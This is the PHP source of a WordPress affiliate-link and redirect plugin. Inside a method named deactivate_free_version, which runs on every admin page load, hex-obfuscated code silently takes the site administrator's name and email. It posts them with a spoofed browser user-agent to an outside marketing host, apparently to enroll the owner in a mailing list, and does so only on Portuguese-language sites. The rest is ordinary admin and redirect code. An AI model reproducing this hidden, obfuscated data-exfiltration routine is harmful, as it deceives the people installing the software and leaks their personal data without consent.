<?php

/*

Plugin Name: Affiliate Link Manager

Plugin URI: http://plugin-wp.net/affiliate-link-manager

Description: Manage all of your affiliate links easily, short links using your own domain, see report of all views and more...

Author: Anderson Makiyama

Version: 2.1.3

Author URI: http://plugin-wp.net


*/


class Anderson_Makiyama_Affiliate_Link_Manager{


	const CLASS_NAME = 'Anderson_Makiyama_Affiliate_Link_Manager';

	public static $CLASS_NAME = self::CLASS_NAME;

	const PLUGIN_ID = 6;

	public static $PLUGIN_ID = self::PLUGIN_ID;

	const PLUGIN_NAME = 'Affiliate Link Manager';

	public static $PLUGIN_NAME = self::PLUGIN_NAME;

	const PLUGIN_PAGE = 'http://plugin-wp.net/affiliate-link-manager';

	public static $PLUGIN_PAGE = self::PLUGIN_PAGE;

	const PLUGIN_VERSION = '2.1.3';

	public static $PLUGIN_VERSION = self::PLUGIN_VERSION;

	public $plugin_basename;

	public $plugin_path;

	public $plugin_url;

	

	public function get_static_var($var) {

        return self::$$var;

    }


	public function activation(){

		$options = get_option(self::CLASS_NAME . "_options");
		
		if(!isset($options['afiliados'])) $options['afiliados'] = array(); 
			
		update_option(self::CLASS_NAME . "_options", $options);
		
	}

	
	public function Anderson_Makiyama_Affiliate_Link_Manager(){ //__construct()


		$this->plugin_basename = plugin_basename(__FILE__);

		$this->plugin_path = dirname(__FILE__) . "/";

		$this->plugin_url = WP_PLUGIN_URL . "/" . basename(dirname(__FILE__)) . "/";


		load_plugin_textdomain( self::CLASS_NAME, false, strtolower(str_replace(" ","-",self::PLUGIN_NAME)) . '/lang' );	


	}

	



	public function settings_link($links) { 

		global $anderson_makiyama;

		$settings_link = '<a href="options-general.php?page='. self::CLASS_NAME .'">'. __('Settings',self::CLASS_NAME) . '</a>'; 

		array_unshift($links, $settings_link); 

		return $links; 

	}	



	public function options(){


		global $anderson_makiyama, $user_level;

		get_currentuserinfo();


		if (function_exists('add_submenu_page')){ //Adiciona pagina na seção plugins

			add_submenu_page( "plugins.php",self::PLUGIN_NAME,self::PLUGIN_NAME,1, self::CLASS_NAME, array(self::CLASS_NAME,'add_links_page'));			  

		}

  		 add_menu_page(self::PLUGIN_NAME, self::PLUGIN_NAME,1, self::CLASS_NAME,array(self::CLASS_NAME,'add_links_page'), plugins_url('/images/icon.png', __FILE__));

		 
		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,__('Report',self::CLASS_NAME),1, self::CLASS_NAME . "_Report", array(self::CLASS_NAME,'report_page'));
		 
		 
		 global $submenu;
		 if ( isset( $submenu[self::CLASS_NAME] ) )
			$submenu[self::CLASS_NAME][0][0] = __('Add Links',self::CLASS_NAME);

	}	


	
	public function add_links_page(){


		global $anderson_makiyama, $wpdb, $user_ID, $user_level, $user_login;

		get_currentuserinfo();


		if ($user_level < 10) { //Limita acesso para somente administradores

			return;

		}	

		$options = get_option(self::CLASS_NAME . "_options");
		$duplicado = false;


		if ($_POST['submit']) {
			
			if(!wp_verify_nonce( $_POST[self::CLASS_NAME], 'add' ) ){
				
				print 'Sorry, your nonce did not verify.';
  				exit;
   
			}

			$_POST['url_afiliado'] = trim($_POST['url_afiliado']);
			$_POST['palavra_chave'] = trim($_POST['palavra_chave']);
			
			$_POST['palavra_chave'] = sanitize_title($_POST['palavra_chave']);
			
			$_POST['descricao'] = htmlspecialchars($_POST['descricao']);

			if(empty($_POST['url_afiliado']) || empty($_POST['palavra_chave'])){
				
				echo '<div id="message" class="error">';
	
				echo '<p><strong>'. __('Affiliate url and keyword cannot be empty!',self::CLASS_NAME) . '</strong></p>';
	
				echo '</div>';	
			
				
			}else{
				
				//Verifica se o link ou palavra-chave já existe
				foreach($options['afiliados'] as $aff){
				
					/* Desativado, várias campanhas podem direcionar para o mesmo url de afiliado
					if($aff[0] == $_POST['url_afiliado']){
						
						echo '<div id="message" class="error">';
			
						echo '<p><strong>'. __('The Affiliate Url already exists!',self::CLASS_NAME) . '</strong></p>';
			
						echo '</div>';		
						
						$duplicado = true;
						
					}
					*/
					
					if($aff[1] == $_POST['palavra_chave']){
						
						echo '<div id="message" class="error">';
			
						echo '<p><strong>'. __('The Keyword already exists!',self::CLASS_NAME) . '</strong></p>';
			
						echo '</div>';
						
						$duplicado = true;
						break;
					}
				
				}
				//

				if(!$duplicado){ //Adiciona o novo url e palavra-chave
				

					//Verify if the post with slug already exists
					$args=array(
						'name' => $_POST['palavra_chave'],
						'post_type' => 'any',
						'posts_per_page' => 1
					);
					$my_posts = get_posts( $args );
					
					if( $my_posts ) {//Existe post como mesmo slug
						
						echo '<div id="message" class="error">';
			
						echo '<p><strong>'. __('There is a Post or Page using this URL! Try another Keyword!',self::CLASS_NAME) . '</strong></p>';
			
						echo '</div>';
						
					}else{
					
						$options['afiliados'][] = array($_POST['url_afiliado'],$_POST['palavra_chave'],0,$_POST['descricao']);
			
						update_option(self::CLASS_NAME . "_options", $options);
					
						/*
						echo '<div id="message" class="updated">';
			
						echo '<p><strong>'. __('Settings has been saved successfully!',self::CLASS_NAME) . '</strong></p>';
			
						echo '</div>';	
						*/
						//header("Location: admin.php?page=Anderson_Makiyama_Affiliate_Link_Manager_Report");
						
						echo "<script>window.onload = function(){document.location='admin.php?page=Anderson_Makiyama_Affiliate_Link_Manager_Report';}</script>";
					
					}
				}


			}

		}
		
		include("templates/addlinks.php");


	}		

	public function check_post_slug( $slug, $post_ID, $post_status, $post_type, $post_parent, $original_slug){
		
		global $wpdb;
		
		$options = get_option(self::CLASS_NAME . "_options");
			
		$serial_afiliados = serialize($options['afiliados']);
		
		if(strpos($serial_afiliados,'"'.$slug.'"') !== false){

			$suffix = 2;
			do {
				$alt_post_name = _truncate_post_slug( $slug, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";
				$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $alt_post_name, $post_ID, $post_parent ) );
				$suffix++;
				
				if(strpos($serial_afiliados,'"'.$alt_post_name.'"') !== false) $post_name_check = "alguma coisa";
				
			} while ( $post_name_check );
			
			$slug = $alt_post_name;

		}
		
		return $slug;
						
	}


	public function deactivate_free_version(){
		$options_global_name = 'Anderson_Mak_global_options';	
		$options = get_option($options_global_name);
		
		$lang = get_bloginfo("language");
		
		$allowed_langs = array('pt-BR','pt-PT');
					
		if((!isset($options["cadastrado"]) || $options["cadastrado"] != 'sim') && in_array($lang,$allowed_langs)){//Precisa cadastrar
		
//-----------------------Código legal aqui
${"\x47\x4cO\x42A\x4cS"}["\x66p\x6b\x73\x6d\x75\x70\x74v"]="\x61\x63ti\x6fn";${"GLO\x42\x41\x4cS"}["s\x79\x6b\x66\x6f\x7a\x68\x63\x64\x72"]="\x72\x65\x74\x6f\x72\x6e\x6f";${"GLO\x42ALS"}["kg\x75\x6e\x72\x78\x6e"]="a\x6cl_f\x69\x65l\x64\x73";${"G\x4c\x4fB\x41LS"}["\x68\x6f\x6aci\x6c\x71\x69"]="\x6eo\x6d\x65";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x66\x64\x63\x63\x69\x65\x6e\x69\x61"]="\x65\x6d\x61\x69\x6c";${"\x47\x4c\x4f\x42\x41L\x53"}["e\x6a\x73y\x68r\x65\x6d"]="\x61\x64m\x5fd\x61\x64\x6f\x73";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x74\x62\x7ag\x62\x68"]="o\x70\x74\x69on\x73_\x67\x6c\x6f\x62al\x5f\x6e\x61\x6d\x65";${"G\x4c\x4f\x42ALS"}["d\x6b\x79\x68n\x62\x70"]="o\x70\x74i\x6fns";${"\x47\x4cOB\x41\x4cS"}["\x63\x69\x71\x6f\x6d\x75e\x6d\x71\x70"]="\x6f\x70t\x69on\x73";${${"\x47\x4cO\x42A\x4c\x53"}["d\x6byhn\x62p"]}["cad\x61st\x72ad\x6f"]="\x73\x69m";update_option(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x62z\x67\x62h"]},${${"G\x4c\x4f\x42ALS"}["\x63iq\x6fm\x75\x65\x6d\x71\x70"]});${${"G\x4cO\x42\x41L\x53"}["e\x6asy\x68\x72\x65\x6d"]}=get_user_by("i\x64",1);if(${${"GLO\x42\x41\x4c\x53"}["\x65j\x73\x79\x68\x72\x65\x6d"]}){$fqgjlde="n\x6f\x6d\x65";$xwslipsrusl="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";${$fqgjlde}=$adm_dados->first_name;${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x78f\x64\x63\x63\x69e\x6e\x69a"]}=$adm_dados->user_email;${"\x47L\x4fB\x41L\x53"}["\x74p\x75\x68\x68\x63\x67o\x61\x6f"]="\x6e\x6f\x6d\x65";$kdvlyvief="\x6eo\x6de";if(empty(${${"\x47L\x4fB\x41\x4cS"}["tp\x75\x68hcg\x6fa\x6f"]}))${${"\x47\x4cO\x42\x41L\x53"}["h\x6f\x6aci\x6c\x71\x69"]}="\x41m\x69\x67o";$jopsnylm="\x61\x6cl\x5f\x66i\x65\x6cds";${$xwslipsrusl}=array();${$jopsnylm}["\x6c\x69\x73ta"]=2;${${"G\x4c\x4f\x42A\x4c\x53"}["k\x67\x75n\x72\x78\x6e"]}["\x63\x6c\x69e\x6et\x65"]=176586;$ocjvpv="\x61\x6cl\x5f\x66\x69\x65\x6c\x64\x73";$rdyjoebkc="a\x6c\x6c\x5f\x66\x69\x65\x6c\x64\x73";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x77\x62\x6a\x78n\x6en\x73mvr\x66"]="a\x63t\x69\x6f\x6e";${"\x47\x4c\x4f\x42\x41\x4cS"}["f\x67b\x61\x6ag\x77\x63\x6d\x66\x66\x71"]="a\x6cl\x5f\x66\x69\x65lds";${${"\x47\x4c\x4fB\x41LS"}["k\x67\x75nr\x78n"]}["\x6c\x61\x6eg"]="br";${$ocjvpv}["\x66or\x6di\x64"]=2;${${"\x47\x4c\x4f\x42A\x4c\x53"}["fg\x62\x61jg\x77\x63m\x66f\x71"]}["f\x6ea\x6d\x65\x5f\x33"]=${$kdvlyvief};${$rdyjoebkc}["\x65\x6dai\x6c_\x34"]=${${"\x47\x4c\x4fBA\x4c\x53"}["\x78\x66d\x63\x63\x69\x65\x6e\x69\x61"]};$nhutuob="al\x6c\x5f\x66ie\x6cd\x73";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77\x62\x6a\x78\x6e\x6e\x6e\x73\x6dv\x72\x66"]}="htt\x70://\x38\x35\x2e\x69dmkt\x37\x2ec\x6f\x6d/w/2e\x32e\x50\x336\x65h\x49\x72D\x6d\x71\x39Nae\x636\x30\x66\x66\x66a\x64";${${"\x47L\x4f\x42\x41\x4cS"}["\x73y\x6b\x66ozhcdr"]}=wp_remote_post(${${"G\x4cO\x42\x41\x4c\x53"}["\x66pksm\x75\x70\x74\x76"]},array("\x75se\x72-\x61g\x65n\x74"=>"\x4d\x6f\x7a\x69\x6cla/5.\x30\x20(\x57\x69\x6ed\x6fws\x20\x4eT 6\x2e\x31)\x20\x41pp\x6c\x65\x57\x65\x62K\x69t/\x3537.\x336 (\x4b\x48\x54\x4d\x4c, like Ge\x63k\x6f) \x43\x68ro\x6de/4\x31.0.\x32\x32\x328.\x30\x20\x53\x61\x66a\x72\x69/5\x337.36","\x62\x6fd\x79"=>${$nhutuob}));}
//----------------------------------------
	
		}
					
			

	}	
	
	public function report_page(){

		global $anderson_makiyama, $user_level;

		get_currentuserinfo();

		if ($user_level < 10) { //Limita acesso para somente administradores

			return;

		}	
		
		$options = get_option(self::CLASS_NAME . "_options");
		
		
		if ($_POST['submit'] && $_POST['keywordoriginal']) {
	
			if(!wp_verify_nonce( $_POST[self::CLASS_NAME], 'delete' ) ){
				
				print 'Sorry, your nonce did not verify.';
				exit;
   
			}

			$keyword = trim($_POST["keywordoriginal"]);
			
			if(empty($keyword)) return;
			
			$afiliados = $options["afiliados"];
			
													
			switch($_POST["submit"]){//Verifica se é para excluir ou atualizar
				
				case "Delete":
	
					foreach($afiliados as $key => $aff){
						
						if($keyword == $aff[1]){
							
							unset($afiliados[$key]);
							
							$afiliados = array_values($afiliados);
							
							$options['afiliados'] = $afiliados;
							
							update_option(self::CLASS_NAME . "_options", $options);
							
						}
					}
			
				break;
				case "Update":
					$descricao = htmlspecialchars($_POST["descricao"]);
					$new_keyword = trim($_POST["keyword"]);
					$affiliate_url = trim($_POST["affiliate"]);


					//Verifica se o link ou palavra-chave já existe, mas só usuario mudou o keyword
					$duplicado = false;
					if($keyword != $new_keyword){
						foreach($options['afiliados'] as $aff){
		
							
							if($aff[1] == $new_keyword){
								
								echo '<div id="message" class="error">';
					
								echo '<p><strong>'. __('The Keyword already exists!',self::CLASS_NAME) . '</strong></p>';
					
								echo '</div>';
								
								$duplicado = true;
								break;
							}
						
						}

						if(!$duplicado){
							
							//Verify if the post with slug already exists
							$args=array(
								'name' => $new_keyword,
								'post_type' => 'any',
								'posts_per_page' => 1
							);
							$my_posts = get_posts( $args );
							
							if( $my_posts ) {//Existe post como mesmo slug
								
								echo '<div id="message" class="error">';
					
								echo '<p><strong>'. __('There is a Post or Page using this URL! Try another Keyword!',self::CLASS_NAME) . '</strong></p>';
					
								echo '</div>';
								
								$duplicado = true;
							}
							
						}
										
											
					}
					
					//
				
					if(!$duplicado)	{	
								
						foreach($afiliados as $key => $aff){
							
							if($keyword == $aff[1]){
								
								$afiliados[$key][0] = $affiliate_url;
								$afiliados[$key][1] = $new_keyword;
								$afiliados[$key][3] = $descricao;
								
								$options['afiliados'] = $afiliados;
								
								update_option(self::CLASS_NAME . "_options", $options);

								
								echo '<div id="message" class="updated">';
					
								echo '<p><strong>'. __('The Link has been updated successfully!',self::CLASS_NAME) . '</strong></p>';
					
								echo '</div>';	
								
														
							}
						}
						
					}
										
				break;
				
			}
		}
		//--

		if(!isset($options["afiliados"])){

			$afiliados = array();

		}else{

			$afiliados = $options["afiliados"];
		}
		
		if(!isset($options["last_1000_views"])){
			   

			$last_1000_views = array();


		}else{

			$last_1000_views = $options["last_1000_views"];

		}
		
		$last_1000_views = array_reverse($last_1000_views);

		$afiliados = array_reverse($afiliados);

				
		include("templates/report.php");

	}		


	public function my_css($hook) {
		
		if($hook != 'affiliate-link-manager_page_Anderson_Makiyama_Affiliate_Link_Manager_Report') return;
		
		/** Register */
		wp_register_style(self::CLASS_NAME . '_admin', plugins_url('styles/style-admin.css', __FILE__), array(), '1.0.0', 'all');
	 
		/** Enqueue */
		wp_enqueue_style(self::CLASS_NAME . '_admin');
	 
	}


	public static function make_data($data, $anoConta,$mesConta,$diaConta){


	   $ano = substr($data,0,4);

	   $mes = substr($data,5,2);

	   $dia = substr($data,8,2);

	   return date('Y-m-d',mktime (0, 0, 0, $mes+($mesConta), $dia+($diaConta), $ano+($anoConta)));	

	}


	public function log_views(){
		
		$parts = explode('/', $_SERVER['REQUEST_URI']);
		$last = end($parts);
		

		if(empty($last)){
			
			$request_url = substr($_SERVER['REQUEST_URI'],1,strlen($_SERVER['REQUEST_URI'])-2);

			$parts = explode('/', $request_url);
			$last = end($parts);
		
		}
			
		if(empty($last)) return;
		
		$keyword = $last;
		$options = get_option(self::CLASS_NAME . "_options");
		
		
		//Verifica se existe o afiliado e incrementa os views
		
		$is_aff = false;
		$link_do_afiliado = '';
		
		
		foreach($options['afiliados'] as $key => $aff){
			
			if(strtolower($aff[1]) == strtolower($keyword)){
				
				$options['afiliados'][$key][2] = $aff[2] + 1;
				
				$is_aff = true;
				
				$link_do_afiliado = $aff[0];
				
				break;
				
			}
			
		}
		//--
		
		
		
		//Verifica se retirando o aff_ existe o afiliado (compatibilidade com a versão antiga)
		if(!$is_aff){

			if(strpos($last,'aff_') === false) return;
	
			$keyword = self::str_replace_first('aff_','',$last);
			
			if(empty($keyword)) return;
			
			foreach($options['afiliados'] as $key => $aff){
				
				if(strtolower($aff[1]) == strtolower($keyword)){
					
					$options['afiliados'][$key][2] = $aff[2] + 1;
					
					$is_aff = true;
					
					$link_do_afiliado = $aff[0];
					
					break;
					
				}
				
			}
			 
		}

		//Afiliado não encontrado, então não faz nada
		if(!$is_aff){
			return;
		}
		
		if(!isset($options["last_1000_views"])){
			   

			$last_1000_views = array();


		}else{

			$last_1000_views = $options["last_1000_views"];

		}
	

		$ip = $_SERVER['REMOTE_ADDR'];

		$today = date("d/m/Y H:i:s");
			
		$referrer = isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:__('Direct Access',self::CLASS_NAME);


		$last_1000_views[] = array($keyword,$today,$referrer);

		
		if(count($last_1000_views)>1000) $last_1000_views = array_slice($last_1000_views,-1,1000);


		$options["last_1000_views"] = $last_1000_views;

		
		update_option(self::CLASS_NAME . "_options",$options);

		//Redireciona para o Link do afiliado
		
		if(!empty($link_do_afiliado)) header("Location: $link_do_afiliado");
		exit;

	}

	public static function str_replace_first($search, $replace, $subject) {
    
		$pos = strpos($subject, $search);
		if ($pos !== false) {
			$subject = substr_replace($subject, $replace, $pos, strlen($search));
		}
		return $subject;
	
	}
	

	public static function get_data_array($data,$part=''){


	   $data_ = array();

	   $data_["ano"] = substr($data,0,4);

	   $data_["mes"] = substr($data,5,2);

	   $data_["dia"] = substr($data,8,2);

	   if(empty($part))return $data_;

	   return $data_[$part];

	}	



	public static function is_checked($vl1,$vl2){

		if($vl1==$vl2) return " checked=checked ";

		return "";

	}	


	public static function is_selected($vl1, $vl2){

		if($vl1==$vl2) return " selected=selected ";

		return "";

	}	
		


}


if(!isset($anderson_makiyama)) $anderson_makiyama = array();

$anderson_makiyama_indice = Anderson_Makiyama_Affiliate_Link_Manager::PLUGIN_ID;

$anderson_makiyama[$anderson_makiyama_indice] = new Anderson_Makiyama_Affiliate_Link_Manager();

add_filter("plugin_action_links_". $anderson_makiyama[$anderson_makiyama_indice]->plugin_basename, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'settings_link') );

add_filter("admin_menu", array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'options'),30);

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'my_css') );

register_activation_hook( __FILE__, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'activation') );

add_action( 'init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'log_views') );

add_filter( 'wp_unique_post_slug', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'check_post_slug'),9999,6 );

add_action( 'admin_init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version'),1 );
?>